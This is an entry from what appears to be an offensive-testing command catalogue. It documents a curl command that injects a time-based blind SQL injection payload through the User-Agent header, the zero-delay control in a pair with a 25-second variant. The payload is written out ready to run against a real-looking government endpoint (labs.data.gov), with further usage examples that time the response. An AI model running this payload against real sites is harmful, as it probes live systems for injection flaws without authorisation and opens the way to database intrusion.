---
id: cmd-no-delay-curl
data: >-
  curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36
  (KHTML, like Gecko)
  Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'" -H "Referer:
  1" -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" -H
  "Accept-Encoding: gzip,deflate" -H "Accept: */*"
  https://labs.data.gov/dashboard/datagov/csv_to_json
tags:
  - sqli
  - http
  - injection
type: command
output: Immediate HTTP response
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.340Z'
verified: false
validated: true
submitted: true
---
# curl-inject-no-delay

## Command

```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'" -H "Referer: 1" -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" -H "Accept-Encoding: gzip,deflate" -H "Accept: */*" https://labs.data.gov/dashboard/datagov/csv_to_json
```

## Description

Injects a zero-sleep SQL payload via User-Agent to verify injection without delay, used for comparison in blind SQLi testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "User-Agent: ..."` | Zero-delay payload in header | Yes |
| Other headers | Mimic AJAX request | No |

## Examples

### Basic Usage

```bash
curl -H "User-Agent: no_delay_payload" https://target.com/endpoint
```

### Advanced Usage

```bash
curl -w "%{time_total}s" -H "User-Agent: payload" https://labs.data.gov/dashboard/datagov/csv_to_json
```

## Expected Output

Quick response (under 1s) with server content, no delay.

## Related

- [[commands/curl-inject-25s-payload]]
- [[procedures/Confirm-SQLi-with-No-Delay]]
